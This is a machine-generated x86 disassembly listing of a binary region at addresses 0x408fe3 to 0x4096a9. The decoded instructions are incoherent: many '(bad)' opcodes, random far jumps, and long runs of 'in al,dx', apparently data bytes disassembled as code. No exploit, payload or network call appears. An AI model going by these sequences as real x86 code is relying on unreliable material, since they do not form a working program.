  408fe3:	add    ch,bl
  408fe5:	(bad)  
  408fe6:	mov    ah,0x0
  408fe8:	loopne 0x408fb6
  408fea:	mov    ebx,0xccd9e800
  408fef:	add    dl,ch
  408ff1:	(bad)  
  408ff3:	add    ah,ah
  408ff5:	rol    edx,1
  408ff7:	add    BYTE PTR [ebp-0x29],ah
  408ffa:	imul   eax,DWORD PTR [eax],0xb7c8df
  409000:	lock out 0xde,al
  409003:	add    BYTE PTR [ebx-0x19ff8262],bh
  409009:	aad    0xc7
  40900b:	add    BYTE PTR [ecx-0x33],cl
  40900e:	dec    ebp
  40900f:	add    BYTE PTR [ebp-0x18ffd6a6],al
  409015:	xlat   BYTE PTR ds:[ebx]
  409016:	retf   0xfc00
  409019:	cld    
  40901a:	cld    
  40901b:	add    dh,bl
  40901d:	fstp   st(0)
  40901f:	add    bh,bl
  409021:	retf   0xb9
  409024:	xor    BYTE PTR [esp+esi*1+0x3f6a9000],dh
  40902b:	add    cl,cl
  40902d:	mov    dh,0x9d
  40902f:	add    cl,cl
  409031:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409032:	xchg   DWORD PTR [eax],eax
  409034:	and    esp,DWORD PTR [esi+0x7aa10027]
  40903a:	dec    edi
  40903b:	add    al,bh
  40903d:	repz out dx,eax
  40903f:	add    BYTE PTR [esi],bh
  409041:	rol    DWORD PTR [edx+0x0],0x92
  409045:	ins    DWORD PTR es:[edi],dx
  409046:	inc    esp
  409047:	add    ah,ah
  409049:	rol    bl,cl
  40904b:	add    ah,ah
  40904d:	loop   0x40902d
  40904f:	add    BYTE PTR [esi-0x26ffb087],bl
  409055:	xlat   BYTE PTR ds:[ebx]
  409056:	iret   
  409057:	add    BYTE PTR [ecx-0x2bffdba1],dl
  40905d:	lds    esi,FWORD PTR [ebx-0x1d181800]
  409063:	add    BYTE PTR [ebp-0x46ffdb9f],dl
  409069:	cwde   
  40906a:	outs   dx,DWORD PTR ds:[esi]
  40906b:	add    ah,bl
  40906d:	les    esi,FWORD PTR [ecx+0x24588500]
  409073:	add    BYTE PTR [ebp-0x67ffa47d],ch
  409079:	jae    0x4090c3
  40907b:	add    cl,al
  40907d:	call   0xe2:0xe9f2006c
  409084:	mov    ds,WORD PTR [ebp+0x24]
  409087:	add    BYTE PTR [edx-0x19ffb07a],dh
  40908d:	jmp    0xed:0xf0f400e9
  409094:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409095:	jp     0x4090df
  409097:	add    BYTE PTR [esi+eax*4-0x7d4effb1],dh
  40909e:	dec    eax
  40909f:	add    BYTE PTR [ebp-0x19ff9372],ch
  4090a5:	aam    0xc6
  4090a7:	add    BYTE PTR [ebp+ebx*8-0x140cff70],cl
  4090ae:	in     al,0x0
  4090b0:	mov    dl,0x8b
  4090b2:	pop    edx
  4090b3:	add    BYTE PTR [eax-0x39ffd0a2],cl
  4090b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090ba:	jge    0x4090bc
  4090bc:	icebp  
  4090bd:	out    0xdf,eax
  4090bf:	add    ah,ch
  4090c1:	out    dx,eax
  4090c2:	out    dx,eax
  4090c3:	add    dh,cl
  4090c5:	lods   al,BYTE PTR ds:[esi]
  4090c6:	xchg   ecx,eax
  4090c7:	add    BYTE PTR [ebx-0x8ffb38a],bl
  4090cd:	icebp  
  4090ce:	in     eax,dx
  4090cf:	add    al,cl
  4090d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090d2:	jge    0x4090d4
  4090d4:	into   
  4090d5:	mov    esi,0xf8fa00a9
  4090da:	test   DWORD PTR [eax],0xbecfe2
  4090e0:	in     eax,dx
  4090e1:	loope  0x4090ba
  4090e3:	add    dh,dl
  4090e5:	enter  0xb7,0xfa
  4090e9:	div    ebp
  4090eb:	add    BYTE PTR [ebp-0x44ff936d],dh
  4090f1:	xchg   edi,eax
  4090f2:	ins    BYTE PTR es:[edi],dx
  4090f3:	add    al,ch
  4090f5:	jmp    0x4090e2
  4090f7:	add    cl,ch
  4090f9:	fcmove st,st(6)
  4090fb:	add    ah,dh
  4090fd:	in     eax,dx
  4090fe:	out    0x0,eax
  409100:	int3   
  409101:	test   eax,0x83a4008c
  409106:	pop    edx
  409107:	add    BYTE PTR [esi-0x11ffaf88],bl
  40910d:	jecxz  0x4090e9
  40910f:	add    al,cl
  409111:	mov    ds:0xeff60082,al
  409116:	jmp    0x8700:0xdce5ef00
  40911d:	pop    esp
  40911e:	sub    eax,0xecf0f700
  409123:	add    bl,bh
  409125:	cld    
  409126:	sti    
  409127:	add    BYTE PTR [ecx-0x24ffcea0],cl
  40912d:	ret    
  40912e:	scas   eax,DWORD PTR es:[edi]
  40912f:	add    BYTE PTR [ebx-0x17ffca9e],cl
  409135:	fmul   st,st(2)
  409137:	add    BYTE PTR [eax+eax*4-0xb07ffa7],ah
  40913e:	lock add ah,ch
  409141:	out    dx,al
  409142:	out    dx,al
  409143:	add    ch,ah
  409145:	rol    ebp,cl
  409147:	add    BYTE PTR [ebp-0xbffb991],dl
  40914d:	cmc    
  40914e:	cmc    
  40914f:	add    ah,dh
  409151:	div    dh
  409153:	add    ch,dh
  409155:	out    dx,al
  409156:	call   0xe62d855b
  40915b:	add    cl,bl
  40915d:	mov    edi,0xf5f600aa
  409162:	repz add ah,ch
  409165:	(bad)  
  409167:	add    ch,bh
  409169:	std    
  40916a:	cld    
  40916b:	add    cl,dh
  40916d:	jmp    0xbf:0xcfe300e3
  409174:	out    0xd6,eax
  409176:	leave  
  409177:	add    ch,ah
  409179:	rol    ah,cl
  40917b:	add    BYTE PTR [eax-0xffb784],ch
  409181:	(bad)  
  409182:	inc    BYTE PTR [eax]
  409184:	sti    
  409185:	stc    
  409186:	test   DWORD PTR [eax],0xbacce0
  40918c:	out    dx,al
  40918d:	jecxz  0x409168
  40918f:	add    al,cl
  409191:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409192:	test   BYTE PTR [eax],al
  409194:	in     al,0xd0
  409196:	rol    DWORD PTR [eax],0xef
  409199:	in     al,0xdb
  40919b:	add    dh,al
  40919d:	lahf   
  40919e:	add    BYTE PTR [eax],0x6f
  4091a1:	mov    ebp,0xe2ed0071
  4091a6:	xlat   BYTE PTR ds:[ebx]
  4091a7:	add    dl,ch
  4091a9:	fcmovne st,st(7)
  4091ab:	add    cl,dl
  4091ad:	mov    cl,0x97
  4091af:	add    BYTE PTR [ebp-0x38ffaa86],bl
  4091b5:	mov    eax,ds:0x88aa0082
  4091ba:	arpl   WORD PTR [eax],ax
  4091bc:	aad    0xb8
  4091be:	mov    eax,ds:0xd6e0ed00
  4091c3:	add    dl,bh
  4091c5:	cmc    
  4091c6:	repnz add bl,ch
  4091c9:	(bad)  
  4091cb:	add    BYTE PTR ds:0xec002f9f,ch
  4091d1:	(bad)  
  4091d3:	add    ah,ch
  4091d5:	loopne 0x4091ac
  4091d7:	add    BYTE PTR [edi-0x30ff7d60],bh
  4091dd:	scas   eax,DWORD PTR es:[edi]
  4091de:	xchg   esp,eax
  4091df:	add    BYTE PTR [edx-0x31ffad87],bl
  4091e5:	mov    edi,0xca6100ab
  4091ea:	add    BYTE PTR fs:[edi-0x5fffb784],ah
  4091f1:	sbb    BYTE PTR [edx+0x0],0xd3
  4091f5:	mov    dh,0x9e
  4091f7:	add    cl,bh
  4091f9:	cmc    
  4091fa:	repz add BYTE PTR [ecx-0x41ff8b6b],bh
  409201:	loop   0x4091c5
  409203:	add    al,al
  409205:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409206:	add    DWORD PTR [eax],0xcbd3d6
  40920c:	jmp    0x4091eb
  40920e:	rol    BYTE PTR [eax],cl
  409210:	sti    
  409211:	clc    
  409212:	cmc    
  409213:	add    BYTE PTR [eax],dl
  409215:	xchg   edx,eax
  409216:	adc    eax,DWORD PTR [eax]
  409218:	jecxz  0x4091ea
  40921a:	rol    BYTE PTR [eax],0x18
  40921d:	fwait
  40921e:	sbb    eax,DWORD PTR [eax]
  409220:	fmulp  st(0),st
  409222:	mov    ch,0x0
  409224:	icebp  
  409225:	call   0x7bea930a
  40922a:	inc    ecx
  40922b:	add    dh,bh
  40922d:	(bad)  
  40922e:	std    
  40922f:	add    ah,dh
  409231:	div    ch
  409233:	add    dh,cl
  409235:	mov    edi,0xbbd700aa
  40923a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40923b:	add    bh,bl
  40923d:	retf   0xb8
  409240:	sti    
  409241:	sti    
  409242:	cld    
  409243:	add    BYTE PTR [ecx+0x77004872],bl
  409249:	(bad)  
  40924a:	jns    0x40924c
  40924c:	xlat   BYTE PTR ds:[ebx]
  40924d:	mov    ebp,0x9db400a6
  409252:	add    DWORD PTR [eax],0x9bb2c4
  409258:	(bad)  
  40925a:	enter  0xfc00,0xfa
  40925e:	stc    
  40925f:	add    BYTE PTR [esi-0x13ffb68e],dl
  409265:	(bad)  
  409267:	add    cl,bl
  409269:	aam    0xcb
  40926b:	add    BYTE PTR [ebx],dh
  40926d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40926e:	ss add dl,bl
  409271:	ret    0xad
  409274:	cld    
  409275:	sti    
  409276:	cli    
  409277:	add    ch,dl
  409279:	int    0xc0
  40927b:	add    BYTE PTR [eax-0x69ffac84],ah
  409281:	jne    0x4092d2
  409283:	add    ah,ch
  409285:	out    dx,eax
  409286:	out    dx,al
  409287:	add    BYTE PTR [edi-0x25ff9f7a],ah
  40928d:	iret   
  40928e:	ret    
  40928f:	add    BYTE PTR [ebx-0x51ffc89c],cl
  409295:	xchg   ecx,eax
  409296:	jo     0x409298
  409298:	mov    al,ds:0xd2005d81
  40929d:	mov    bl,0x99
  40929f:	add    dh,ch
  4092a1:	jecxz  0x40927b
  4092a3:	add    al,ch
  4092a5:	jmp    0x409293
  4092a7:	add    ch,ah
  4092a9:	call   0xf6369397
  4092ae:	hlt    
  4092af:	add    al,ch
  4092b1:	fxch   st(6)
  4092b3:	add    cl,dl
  4092b5:	shr    DWORD PTR [edi-0x1f170e00],0x0
  4092bc:	jmp    0xb741609b
  4092c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092c2:	pushf  
  4092c3:	add    ah,bh
  4092c5:	cli    
  4092c6:	test   DWORD PTR [eax],0x90a7ba
  4092cc:	rol    ah,cl
  4092ce:	mov    ah,0x0
  4092d0:	sbb    BYTE PTR [edx-0x140bffe5],bl
  4092d6:	in     al,0x0
  4092d8:	shl    DWORD PTR [ebx+ebx*4-0x6f513c00],cl
  4092df:	add    BYTE PTR [ebx-0x4ffd6a8],al
  4092e5:	cli    
  4092e6:	test   DWORD PTR [eax],0xc6d1d7
  4092ec:	call   0xe04178d9
  4092f1:	(bad)  
  4092f2:	int3   
  4092f3:	add    bl,cl
  4092f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092f6:	mov    DWORD PTR [eax],eax
  4092f8:	aam    0xb7
  4092fa:	lahf   
  4092fb:	add    BYTE PTR [eax+esi*4-0x2a1aff55],bh
  409302:	mov    BYTE PTR [eax],0xe2
  409305:	int    0xbe
  409307:	add    cl,bh
  409309:	div    dl
  40930b:	add    BYTE PTR [edi],bh
  40930d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40930e:	inc    edx
  40930f:	add    bh,cl
  409311:	mov    al,0x95
  409313:	add    bl,ch
  409315:	in     al,dx
  409316:	jmp    0xb000:0xbfd0e300
  40931d:	test   DWORD PTR [esi+0x0],ebx
  409320:	nop
  409321:	push   0x40
  409323:	add    BYTE PTR [ecx-0x4dff785e],bh
  409329:	mov    DWORD PTR [ebx+0x0],esp
  40932c:	std    
  40932d:	std    
  40932e:	std    
  40932f:	add    bl,ah
  409331:	out    0xe7,eax
  409333:	add    BYTE PTR [ecx-0x40ff8063],bh
  409339:	mov    ah,0xb2
  40933b:	add    bh,bh
  40933d:	(bad)  
  40933e:	inc    DWORD PTR [eax]
	...
  409390:	in     al,dx
  409391:	in     al,dx
  409392:	in     al,dx
  409393:	in     al,dx
  409394:	in     al,dx
  409395:	in     al,dx
  409396:	in     al,dx
  409397:	in     al,dx
  409398:	in     al,dx
  409399:	in     al,dx
  40939a:	in     al,dx
  40939b:	in     al,dx
  40939c:	in     al,dx
  40939d:	in     al,dx
  40939e:	in     al,dx
  40939f:	in     al,dx
  4093a0:	in     al,dx
  4093a1:	in     al,dx
  4093a2:	in     al,dx
  4093a3:	in     al,dx
  4093a4:	in     al,dx
  4093a5:	in     al,dx
  4093a6:	in     al,dx
  4093a7:	in     al,dx
  4093a8:	in     al,dx
  4093a9:	in     al,dx
  4093aa:	in     al,dx
  4093ab:	in     al,dx
  4093ac:	in     al,dx
  4093ad:	in     al,dx
  4093ae:	in     al,dx
  4093af:	in     al,dx
  4093b0:	in     al,dx
  4093b1:	in     al,dx
  4093b2:	in     al,dx
  4093b3:	in     al,dx
  4093b4:	in     al,dx
  4093b5:	in     al,dx
  4093b6:	in     al,dx
  4093b7:	in     al,dx
  4093b8:	in     al,dx
  4093b9:	in     al,dx
  4093ba:	in     al,dx
  4093bb:	in     al,dx
  4093bc:	in     al,dx
  4093bd:	in     al,dx
  4093be:	in     al,dx
  4093bf:	in     al,dx
  4093c0:	in     al,dx
  4093c1:	in     al,dx
  4093c2:	in     al,dx
  4093c3:	in     al,dx
  4093c4:	in     al,dx
  4093c5:	in     al,dx
  4093c6:	in     al,dx
  4093c7:	in     al,dx
  4093c8:	in     al,dx
  4093c9:	in     al,dx
  4093ca:	in     al,dx
  4093cb:	in     al,dx
  4093cc:	in     al,dx
  4093cd:	in     al,dx
  4093ce:	in     al,dx
  4093cf:	in     al,dx
  4093d0:	in     al,dx
  4093d1:	in     al,dx
  4093d2:	in     al,dx
  4093d3:	in     al,dx
  4093d4:	in     al,dx
  4093d5:	in     al,dx
  4093d6:	in     al,dx
  4093d7:	in     al,dx
  4093d8:	in     al,dx
  4093d9:	in     al,dx
  4093da:	in     al,dx
  4093db:	in     al,dx
  4093dc:	in     al,dx
  4093dd:	in     al,dx
  4093de:	in     al,dx
  4093df:	in     al,dx
  4093e0:	in     al,dx
  4093e1:	in     al,dx
  4093e2:	in     al,dx
  4093e3:	add    BYTE PTR [eax],al
  4093e5:	add    BYTE PTR [eax],al
  4093e7:	add    ah,ch
  4093e9:	in     al,dx
  4093ea:	in     al,dx
  4093eb:	in     al,dx
  4093ec:	in     al,dx
  4093ed:	in     al,dx
  4093ee:	in     al,dx
  4093ef:	in     al,dx
  4093f0:	in     al,dx
  4093f1:	in     al,dx
  4093f2:	in     al,dx
  4093f3:	in     al,dx
  4093f4:	in     al,dx
  4093f5:	in     al,dx
  4093f6:	in     al,dx
  4093f7:	in     al,dx
  4093f8:	in     al,dx
  4093f9:	in     al,dx
  4093fa:	in     al,dx
  4093fb:	in     al,dx
  4093fc:	in     al,dx
  4093fd:	in     al,dx
  4093fe:	in     al,dx
  4093ff:	in     al,dx
  409400:	in     al,dx
  409401:	in     al,dx
  409402:	in     al,dx
  409403:	in     al,dx
  409404:	in     al,dx
  409405:	in     al,dx
  409406:	in     al,dx
  409407:	in     al,dx
  409408:	in     al,dx
  409409:	in     al,dx
  40940a:	in     al,dx
  40940b:	in     al,dx
  40940c:	in     al,dx
  40940d:	in     al,dx
  40940e:	in     al,dx
  40940f:	in     al,dx
  409410:	in     al,dx
  409411:	in     al,dx
  409412:	and    BYTE PTR [eax-0x77],ah
  409415:	add    DWORD PTR [ebx-0x13131400],0xffffffec
  40941c:	in     al,dx
  40941d:	in     al,dx
  40941e:	in     al,dx
  40941f:	in     al,dx
  409420:	in     al,dx
  409421:	in     al,dx
  409422:	in     al,dx
  409423:	in     al,dx
  409424:	in     al,dx
  409425:	in     al,dx
  409426:	in     al,dx
  409427:	in     al,dx
  409428:	in     al,dx
  409429:	in     al,dx
  40942a:	in     al,dx
  40942b:	in     al,dx
  40942c:	in     al,dx
  40942d:	in     al,dx
  40942e:	in     al,dx
  40942f:	in     al,dx
  409430:	in     al,dx
  409431:	in     al,dx
  409432:	in     al,dx
  409433:	in     al,dx
  409434:	in     al,dx
  409435:	in     al,dx
  409436:	in     al,dx
  409437:	in     al,dx
  409438:	in     al,dx
  409439:	in     al,dx
  40943a:	in     al,dx
  40943b:	in     al,dx
  40943c:	in     al,dx
  40943d:	in     al,dx
  40943e:	in     al,dx
  40943f:	in     al,dx
  409440:	in     al,dx
  409441:	in     al,dx
  409442:	and    BYTE PTR [eax+0x60],ah
  409445:	pusha  
  409446:	mov    DWORD PTR [eax],eax
  409448:	in     al,dx
  409449:	in     al,dx
  40944a:	in     al,dx
  40944b:	in     al,dx
  40944c:	in     al,dx
  40944d:	in     al,dx
  40944e:	in     al,dx
  40944f:	in     al,dx
  409450:	in     al,dx
  409451:	in     al,dx
  409452:	in     al,dx
  409453:	in     al,dx
  409454:	in     al,dx
  409455:	in     al,dx
  409456:	in     al,dx
  409457:	in     al,dx
  409458:	in     al,dx
  409459:	in     al,dx
  40945a:	in     al,dx
  40945b:	in     al,dx
  40945c:	in     al,dx
  40945d:	in     al,dx
  40945e:	in     al,dx
  40945f:	in     al,dx
  409460:	in     al,dx
  409461:	in     al,dx
  409462:	in     al,dx
  409463:	in     al,dx
  409464:	in     al,dx
  409465:	in     al,dx
  409466:	in     al,dx
  409467:	in     al,dx
  409468:	in     al,dx
  409469:	in     al,dx
  40946a:	in     al,dx
  40946b:	in     al,dx
  40946c:	in     al,dx
  40946d:	in     al,dx
  40946e:	in     al,dx
  40946f:	in     al,dx
  409470:	in     al,dx
  409471:	and    BYTE PTR [ebx+0x206060d9],bl
  409477:	in     al,dx
  409478:	in     al,dx
  409479:	in     al,dx
  40947a:	in     al,dx
  40947b:	in     al,dx
  40947c:	in     al,dx
  40947d:	in     al,dx
  40947e:	in     al,dx
  40947f:	in     al,dx
  409480:	in     al,dx
  409481:	in     al,dx
  409482:	in     al,dx
  409483:	in     al,dx
  409484:	in     al,dx
  409485:	in     al,dx
  409486:	in     al,dx
  409487:	in     al,dx
  409488:	in     al,dx
  409489:	in     al,dx
  40948a:	in     al,dx
  40948b:	in     al,dx
  40948c:	in     al,dx
  40948d:	in     al,dx
  40948e:	in     al,dx
  40948f:	in     al,dx
  409490:	in     al,dx
  409491:	in     al,dx
  409492:	in     al,dx
  409493:	in     al,dx
  409494:	in     al,dx
  409495:	in     al,dx
  409496:	in     al,dx
  409497:	in     al,dx
  409498:	in     al,dx
  409499:	in     al,dx
  40949a:	in     al,dx
  40949b:	in     al,dx
  40949c:	in     al,dx
  40949d:	in     al,dx
  40949e:	in     al,dx
  40949f:	in     al,dx
  4094a0:	in     al,dx
  4094a1:	pop    sp
  4094a3:	pop    esp
  4094a4:	(bad)  
  4094a6:	and    ah,ch
  4094a8:	in     al,dx
  4094a9:	in     al,dx
  4094aa:	in     al,dx
  4094ab:	in     al,dx
  4094ac:	in     al,dx
  4094ad:	in     al,dx
  4094ae:	in     al,dx
  4094af:	in     al,dx
  4094b0:	in     al,dx
  4094b1:	in     al,dx
  4094b2:	in     al,dx
  4094b3:	in     al,dx
  4094b4:	in     al,dx
  4094b5:	in     al,dx
  4094b6:	in     al,dx
  4094b7:	sbb    eax,0x3003032a
  4094bc:	adc    ebp,esp
  4094be:	in     al,dx
  4094bf:	in     al,dx
  4094c0:	in     al,dx
  4094c1:	in     al,dx
  4094c2:	in     al,dx
  4094c3:	in     al,dx
  4094c4:	in     al,dx
  4094c5:	in     al,dx
  4094c6:	in     al,dx
  4094c7:	in     al,dx
  4094c8:	in     al,dx
  4094c9:	in     al,dx
  4094ca:	in     al,dx
  4094cb:	in     al,dx
  4094cc:	in     al,dx
  4094cd:	in     al,dx
  4094ce:	in     al,dx
  4094cf:	in     al,dx
  4094d0:	add    ebx,DWORD PTR [ebx+0x205c5c4d]
  4094d6:	in     al,dx
  4094d7:	in     al,dx
  4094d8:	in     al,dx
  4094d9:	in     al,dx
  4094da:	in     al,dx
  4094db:	in     al,dx
  4094dc:	in     al,dx
  4094dd:	in     al,dx
  4094de:	in     al,dx
  4094df:	in     al,dx
  4094e0:	in     al,dx
  4094e1:	in     al,dx
  4094e2:	in     al,dx
  4094e3:	in     al,dx
  4094e4:	in     al,dx
  4094e5:	push   edi
  4094e6:	cmp    eax,0x771c278a
  4094eb:	daa    
  4094ec:	mov    esi,0xecec4400
  4094f1:	in     al,dx
  4094f2:	in     al,dx
  4094f3:	in     al,dx
  4094f4:	in     al,dx
  4094f5:	in     al,dx
  4094f6:	in     al,dx
  4094f7:	in     al,dx
  4094f8:	in     al,dx
  4094f9:	in     al,dx
  4094fa:	in     al,dx
  4094fb:	in     al,dx
  4094fc:	in     al,dx
  4094fd:	in     al,dx
  4094fe:	in     al,dx
  4094ff:	in     al,dx
  409500:	add    ecx,DWORD PTR [ebp+0x4d]
  409503:	dec    ebp
  409504:	dec    ebp
  409505:	dec    ecx
  409506:	in     al,dx
  409507:	in     al,dx
  409508:	in     al,dx
  409509:	in     al,dx
  40950a:	in     al,dx
  40950b:	in     al,dx
  40950c:	in     al,dx
  40950d:	in     al,dx
  40950e:	in     al,dx
  40950f:	in     al,dx
  409510:	in     al,dx
  409511:	in     al,dx
  409512:	in     al,dx
  409513:	in     al,dx
  409514:	sub    dh,BYTE PTR [edx]
  409516:	xor    esi,DWORD PTR [edx+eiz*1+0x22]
  40951a:	and    ah,BYTE PTR [edx]
  40951c:	push   edx
  40951d:	push   ebp
  40951e:	add    BYTE PTR [edx],bh
  409520:	in     al,dx
  409521:	in     al,dx
  409522:	in     al,dx
  409523:	in     al,dx
  409524:	in     al,dx
  409525:	in     al,dx
  409526:	add    ah,ch
  409528:	in     al,dx
  409529:	in     al,dx
  40952a:	in     al,dx
  40952b:	in     al,dx
  40952c:	in     al,dx
  40952d:	in     al,dx
  40952e:	in     al,dx
  40952f:	adc    cl,ch
  409531:	ret    
  409532:	loopne 0x409581
  409534:	add    ebp,esp
  409536:	in     al,dx
  409537:	in     al,dx
  409538:	in     al,dx
  409539:	in     al,dx
  40953a:	in     al,dx
  40953b:	in     al,dx
  40953c:	in     al,dx
  40953d:	in     al,dx
  40953e:	in     al,dx
  40953f:	in     al,dx
  409540:	in     al,dx
  409541:	in     al,dx
  409542:	in     al,dx
  409543:	jnp    0x40957a
  409545:	xor    al,0x74
  409547:	mov    cr4,edx
  40954a:	and    ah,BYTE PTR [edx]
  40954c:	and    ah,BYTE PTR [edx]
  40954e:	inc    eax
  40954f:	add    BYTE PTR [edx],bh
  409551:	in     al,dx
  409552:	in     al,dx
  409553:	in     al,dx
  409554:	in     al,dx
  409555:	in     al,dx
  409556:	add    BYTE PTR [ecx-0x14],cl
  409559:	in     al,dx
  40955a:	in     al,dx
  40955b:	in     al,dx
  40955c:	in     al,dx
  40955d:	in     al,dx
  40955e:	in     al,dx
  40955f:	adc    bl,al
  409561:	ret    
  409562:	ret    
  409563:	ret    
  409564:	add    ebp,esp
  409566:	in     al,dx
  409567:	in     al,dx
  409568:	in     al,dx
  409569:	in     al,dx
  40956a:	in     al,dx
  40956b:	in     al,dx
  40956c:	in     al,dx
  40956d:	in     al,dx
  40956e:	in     al,dx
  40956f:	in     al,dx
  409570:	in     al,dx
  409571:	in     al,dx
  409572:	pop    eax
  409573:	push   es
  409574:	das    
  409575:	ins    BYTE PTR es:[edi],dx
  409576:	add    DWORD PTR [edi+ecx*1+0x22],esi
  40957a:	and    ah,BYTE PTR [edx]
  40957c:	and    ah,BYTE PTR [edx]
  40957e:	and    al,BYTE PTR [eax+0x38]
  409581:	inc    esp
  409582:	in     al,dx
  409583:	in     al,dx
  409584:	in     al,dx
  409585:	in     al,dx
  409586:	add    BYTE PTR [edi],dh
  409588:	cmp    ch,ah
  40958a:	in     al,dx
  40958b:	in     al,dx
  40958c:	in     al,dx
  40958d:	in     al,dx
  40958e:	es xchg edx,eax
  409590:	stos   BYTE PTR es:[edi],al
  409591:	stos   BYTE PTR es:[edi],al
  409592:	ret    
  409593:	adc    ah,ch
  409595:	in     al,dx
  409596:	in     al,dx
  409597:	in     al,dx
  409598:	in     al,dx
  409599:	in     al,dx
  40959a:	in     al,dx
  40959b:	in     al,dx
  40959c:	in     al,dx
  40959d:	in     al,dx
  40959e:	in     al,dx
  40959f:	in     al,dx
  4095a0:	in     al,dx
  4095a1:	in     al,dx
  4095a2:	push   es
  4095a3:	xchg   ebp,eax
  4095a4:	aas    
  4095a5:	ins    BYTE PTR es:[edi],dx
  4095a6:	ins    BYTE PTR es:[edi],dx
  4095a7:	add    DWORD PTR [edi+ecx*1+0x22],esi
  4095ab:	and    ah,BYTE PTR [edx]
  4095ad:	and    ah,BYTE PTR [edx]
  4095af:	and    dl,BYTE PTR [ebp+0x38]
  4095b2:	in     al,dx
  4095b3:	in     al,dx
  4095b4:	in     al,dx
  4095b5:	in     al,dx
  4095b6:	add    BYTE PTR [esp+eiz*4-0x131313f0],ah
  4095bd:	in     al,dx
  4095be:	or     ch,BYTE PTR [edx+0x10aaaaaa]
  4095c4:	in     al,dx
  4095c5:	in     al,dx
  4095c6:	in     al,dx
  4095c7:	in     al,dx
  4095c8:	in     al,dx
  4095c9:	in     al,dx
  4095ca:	in     al,dx
  4095cb:	in     al,dx
  4095cc:	in     al,dx
  4095cd:	in     al,dx
  4095ce:	in     al,dx
  4095cf:	in     al,dx
  4095d0:	in     al,dx
  4095d1:	dec    edx
  4095d2:	or     BYTE PTR ss:[eax],cl
  4095d5:	aas    
  4095d6:	aas    
  4095d7:	dec    esp
  4095d8:	add    DWORD PTR [edi+ecx*1+0x22],esi
  4095dc:	and    ah,BYTE PTR [edx]
  4095de:	and    ah,BYTE PTR [edx]
  4095e0:	push   edx
  4095e1:	xchg   edx,eax
  4095e2:	adc    ebp,esp
  4095e4:	in     al,dx
  4095e5:	in     al,dx
  4095e6:	and    BYTE PTR [ebx-0x13a1c85c],ch
  4095ec:	in     al,dx
  4095ed:	or     cl,BYTE PTR [ecx-0x1b558c8d]
  4095f3:	in     al,dx
  4095f4:	in     al,dx
  4095f5:	in     al,dx
  4095f6:	in     al,dx
  4095f7:	in     al,dx
  4095f8:	in     al,dx
  4095f9:	in     al,dx
  4095fa:	in     al,dx
  4095fb:	in     al,dx
  4095fc:	in     al,dx
  4095fd:	in     al,dx
  4095fe:	in     al,dx
  4095ff:	in     al,dx
  409600:	in     al,dx
  409601:	ds daa 
  409603:	aas    
  409604:	call   0x4c7fd511
  409609:	add    DWORD PTR [esi],ecx
  40960b:	and    ah,BYTE PTR [edx]
  40960d:	and    ah,BYTE PTR [edx]
  40960f:	and    ah,BYTE PTR [edx]
  409611:	(bad)  
  409612:	pop    esi
  409613:	in     al,dx
  409614:	in     al,dx
  409615:	in     al,dx
  409616:	and    BYTE PTR [edx],dl
  409618:	adc    ch,BYTE PTR [ebx-0x4b134455]
  40961e:	aaa    
  40961f:	aaa    
  409620:	jae    0x409695
  409622:	in     al,0xec
  409624:	in     al,dx
  409625:	in     al,dx
  409626:	in     al,dx
  409627:	in     al,dx
  409628:	in     al,dx
  409629:	in     al,dx
  40962a:	in     al,dx
  40962b:	in     al,dx
  40962c:	in     al,dx
  40962d:	in     al,dx
  40962e:	in     al,dx
  40962f:	in     al,dx
  409630:	in     al,dx
  409631:	pop    es
  409632:	xor    DWORD PTR [eax],ecx
  409634:	aas    
  409635:	aas    
  409636:	call   0x18cd57a
  40963b:	je     0x40964b
  40963d:	and    ah,BYTE PTR [edx]
  40963f:	and    ah,BYTE PTR [edx]
  409641:	ins    BYTE PTR es:[edi],dx
  409642:	add    ebp,esp
  409644:	in     al,dx
  409645:	in     al,dx
  409646:	and    BYTE PTR [esi],ch
  409648:	adc    dl,BYTE PTR [edx]
  40964a:	adc    dl,BYTE PTR [edx]
  40964c:	push   0xffffffb8
  40964e:	aaa    
  40964f:	aaa    
  409650:	aaa    
  409651:	mov    ah,0xec
  409653:	in     al,dx
  409654:	in     al,dx
  409655:	in     al,dx
  409656:	in     al,dx
  409657:	in     al,dx
  409658:	in     al,dx
  409659:	in     al,dx
  40965a:	in     al,dx
  40965b:	in     al,dx
  40965c:	in     al,dx
  40965d:	in     al,dx
  40965e:	in     al,dx
  40965f:	in     al,dx
  409660:	in     al,dx
  409661:	pop    es
  409662:	xor    eax,ebp
  409664:	or     al,ch
  409666:	call   0x4cacd653
  40966b:	add    DWORD PTR [edi+ecx*1+0x22],esi
  40966f:	and    ah,BYTE PTR [edx]
  409671:	xor    al,0x3
  409673:	in     al,dx
  409674:	in     al,dx
  409675:	in     al,dx
  409676:	data16 cs cs adc dl,BYTE PTR cs:[edx]
  40967c:	adc    dl,BYTE PTR [edx]
  40967e:	stos   DWORD PTR es:[edi],eax
  40967f:	stos   DWORD PTR es:[edi],eax
  409680:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409681:	mov    ah,0xec
  409683:	in     al,dx
  409684:	in     al,dx
  409685:	in     al,dx
  409686:	in     al,dx
  409687:	in     al,dx
  409688:	in     al,dx
  409689:	in     al,dx
  40968a:	in     al,dx
  40968b:	in     al,dx
  40968c:	in     al,dx
  40968d:	in     al,dx
  40968e:	in     al,dx
  40968f:	in     al,dx
  409690:	in     al,dx
  409691:	ds daa 
  409693:	aas    
  409694:	call   0xe9297f81
  409699:	aas    
  40969a:	aas    
  40969b:	dec    esp
  40969c:	add    DWORD PTR [edi+ecx*1+0x22],esi
  4096a0:	and    dh,BYTE PTR [ebx]
  4096a2:	sub    ch,ah
  4096a4:	in     al,dx
  4096a5:	in     al,dx
  4096a6:	add    edi,DWORD PTR [ecx+0x79]
  4096a9:	cs cs cs adc dl,BYTE PTR cs:[edx]
